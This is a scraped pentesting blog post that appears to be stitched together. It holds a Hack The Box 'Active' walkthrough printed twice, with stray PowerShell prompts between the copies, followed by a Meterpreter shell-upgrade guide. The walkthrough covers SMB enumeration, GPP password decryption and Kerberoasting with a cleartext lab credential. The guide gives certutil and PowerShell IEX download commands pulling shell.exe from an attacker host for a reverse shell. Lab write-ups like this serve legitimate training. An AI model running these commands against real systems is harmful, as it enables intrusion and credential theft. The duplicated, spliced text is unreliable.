---
title: "Upgrading Shells"
date: 2024-07-02 21:55:00 +0800
categories: [Shells-Upgrade, Meterpreter]
tags: [Devel, Easy-Level, Windows-PrivEsc]
---

![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Not so Important Intro:
Hello Folks, Today I’m going through an easy machine, Which is comprised of Active Directory Enumeration and Also compromising the domain controller. I’m gonna write a series of active directory machines from HTB. Since it is gonna help with my PNPT.
For those who have common goals like OSCP. It can be helpful follow-up. Since I’m gonna do a memory palace for every machine at the end of the write-up.
Now now, Enough Intro…
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Analyzing Nmap result:
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
we have 135 open for RPC, 139 NetBIOS-SSN & 445 for SMB. Since It was running a domain server. And 464 kpasswd5,593 ncacn_http and 3268 LDAP are the common ports that can let us identify it as a Windows domain controller.
As we start with 445 SMB, You can always start with smbclient to try connecting every possible share it can connect. In this case, anonymous login was allowed. so we could list shares with the command
smbclient -L //////
You can also use smbmap to see the permissions that are kept on these shares.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Also can Enumerate the shares with “smbclient \\\\<IP>\\\share” each share at a time. Helps me try connecting the shares one by one.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
At this point, I saw there is a directory called active.htb\ Which does have recursive directories, It is gonna take time tabbing to find out all the directories that exist on this share. 
So, I tried using recurse cmd. Which can recursively parse all the directories inside it for us. For this trick to work, I need to start the command with recurse & end it with recurse to stop using this. You can see the below example to understand what I am talking about.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
With this in hand, I was able to find there is a Groups.xml that would normally consist of the information regarding the Group policy preferences. So, Using “get” cmd I got this file over to our Kali machine.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
While observing closely, we already got name =” active.htb\SVC_TGS” We can see there is “cpassword” is presented inside the XML file. Which seems to be encrypted. And since, it is a GPP file. We can decrypt it with a tool called “gpp-decrypt”. available on Kali Linux.
gpp-decrypt
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
So, if we are gonna double check these credentials with smbmap,
Now, we have some credentials in hand, we can just go try these details with our beloved smbclient once again,
smbclient //10.10.10.100/Users -U active.htb/SVC_TGS
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Tadatadattaaaaa!! We got the User Flag.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
We got some foothold on the machine. now we can access the machine remotely and have some credentials in hand.
I searched thoroughly to see any other things I could do, secretsdump, psexec, etc..; these tools can let us improvise towards token impersonation.
Nothing worked. During this phase after getting some access, people go towards lateral movement escalation.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Kerberoasting is another method that grants us tickets enabling us privilege escalation and better access. Since, normally kerb account is an admin privilege user on a domain controller.  
For some detailed notes, Feel free to read these notes here kerberoasting, or other YouTube videos for a better explanation.
sudo GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Got the ticket!!! let’s decrypt it further using hashcat. we can also see we got ticket of a administrator account.
Hashcat Cracking:
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Got the password!!😁
Successfully compromised the Domain!! We got the Admin Shell.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Let’s get the root flag for the credit.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
In-Summary: Active is an easy to medium-difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.
why we are doing, what we are doing?
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
PS C:\Users\Eshwa> C:/Users/Eshwa/AppData/Local/Microsoft/WindowsApps/python3.10.exe C:\Users\Eshwa\image_replace.py

![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Not so Important Intro:
Hello Folks, Today I’m going through an easy machine, Which is comprised of Active Directory Enumeration and Also compromising the domain controller. I’m gonna write a series of active directory machines from HTB. Since it is gonna help with my PNPT.
For those who have common goals like OSCP. It can be helpful follow-up. Since I’m gonna do a memory palace for every machine at the end of the write-up.
Now now, Enough Intro…
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Analyzing Nmap result:
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
we have 135 open for RPC, 139 NetBIOS-SSN & 445 for SMB. Since It was running a domain server. And 464 kpasswd5,593 ncacn_http and 3268 LDAP are the common ports that can let us identify it as a Windows domain controller.
As we start with 445 SMB, You can always start with smbclient to try connecting every possible share it can connect. In this case, anonymous login was allowed. so we could list shares with the command
smbclient -L //////
You can also use smbmap to see the permissions that are kept on these shares.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Also can Enumerate the shares with “smbclient \\\\<IP>\\\share” each share at a time. Helps me try connecting the shares one by one.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
At this point, I saw there is a directory called active.htb\ Which does have recursive directories, It is gonna take time tabbing to find out all the directories that exist on this share. 
So, I tried using recurse cmd. Which can recursively parse all the directories inside it for us. For this trick to work, I need to start the command with recurse & end it with recurse to stop using this. You can see the below example to understand what I am talking about.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
With this in hand, I was able to find there is a Groups.xml that would normally consist of the information regarding the Group policy preferences. So, Using “get” cmd I got this file over to our Kali machine.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
While observing closely, we already got name =” active.htb\SVC_TGS” We can see there is “cpassword” is presented inside the XML file. Which seems to be encrypted. And since, it is a GPP file. We can decrypt it with a tool called “gpp-decrypt”. available on Kali Linux.
gpp-decrypt
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
So, if we are gonna double check these credentials with smbmap,
Now, we have some credentials in hand, we can just go try these details with our beloved smbclient once again,
smbclient //10.10.10.100/Users -U active.htb/SVC_TGS
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Tadatadattaaaaa!! We got the User Flag.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
We got some foothold on the machine. now we can access the machine remotely and have some credentials in hand.
I searched thoroughly to see any other things I could do, secretsdump, psexec, etc..; these tools can let us improvise towards token impersonation.
Nothing worked. During this phase after getting some access, people go towards lateral movement escalation.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Kerberoasting is another method that grants us tickets enabling us privilege escalation and better access. Since, normally kerb account is an admin privilege user on a domain controller.  
For some detailed notes, Feel free to read these notes here kerberoasting, or other YouTube videos for a better explanation.
sudo GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Got the ticket!!! let’s decrypt it further using hashcat. we can also see we got ticket of a administrator account.
Hashcat Cracking:
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Got the password!!😁
Successfully compromised the Domain!! We got the Admin Shell.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Let’s get the root flag for the credit.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
In-Summary: Active is an easy to medium-difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.
why we are doing, what we are doing?
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)

PS C:\Users\Eshwa> ^C
PS C:\Users\Eshwa> C:/Users/Eshwa/AppData/Local/Microsoft/WindowsApps/python3.10.exe C:\Users\Eshwa\scrape-medium.py
Tired of netcat shell,
why Meterpreter again?: you cannot use a few system commands and run Meterpreter exploits, You cannot run any of the staged payloads which normally take fewer bytes (gonna be useful in situations, Where you would require less than 512 bytes as a payload For Example).
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Hello guys!! I am gonna write a dynamic walkthrough for this blog post. I will keep updating this, as soon as I get to know new tricks. Please check back for updates.
Architecture:
First of all, knowing the architecture of the machine we are attacking is the most important step in building our payload for a Meterpreter shell.
Use the following cmds to find Architecture,
or sysinfo would be in handy…
still unclear. For example, Instead of using windows/x64/meterpreter/reverse_tcp
choose the windows/meterpreter/reverse_tcp as a default for x86 and x64. But that would limit the number of payloads we can use. You can simply find it by tabbing it.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Either way. it is gonna work both ways, with no problem.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Now, As we have some payload in our hands let’s upload it to the machine’s reach enabling us to execute it for the shell.
File Transfers:
if you’re on an SMB or an Evil-Winrm shell you can simply do put command or download.
For File transferring between the victim Windows machine to our Kali. First of all, we need to host our files on an HTTP or FTP server in the network. So, that the victim’s machine can access our payload.
Most common way to start a HTTP server is using python2 or python3.
python -m SimpleHttpServer 80 or python3 -m http.server 80
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
And running certutil -urlcache -f http://10.10.14.17/shell.exe shell.exe
would download the file from our Kali machine to this victim machine.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
If PowerShell commands were permitted then,
Use IEX(New-Object Net.WebClient).downloadString(‘http://10.10.14.17/shell.exe')
With that, the payload delivery should be done. Let’s move on to the next step.
Listening for a Meterpreter Shell:
Another common way of doing this is gonna be use the msfconsole exploit/multi/handler would be the best listener for this job.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
By default, it is configured with some BS payload. Configure the same payload you have created and uploaded to the victim machine.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
set LHOST & LPORT with your own as similar to the payload you have uploaded!! and run it!!
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
All we are waiting for right now is to execution of the payload from client side.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
or in some cases, if the file is accessible through the web, You can simply browse the file for execution.
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
And TADAaa!! We’ll get the Meterpreter shell!!
![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aSMEYEGhZ3fI9vaMPz8LJg.png)
Follow me, for more Priv Escalations, Active Directory Concepts & Other Pentesting Concepts, I can update you. As I learn them!! Thank you :-)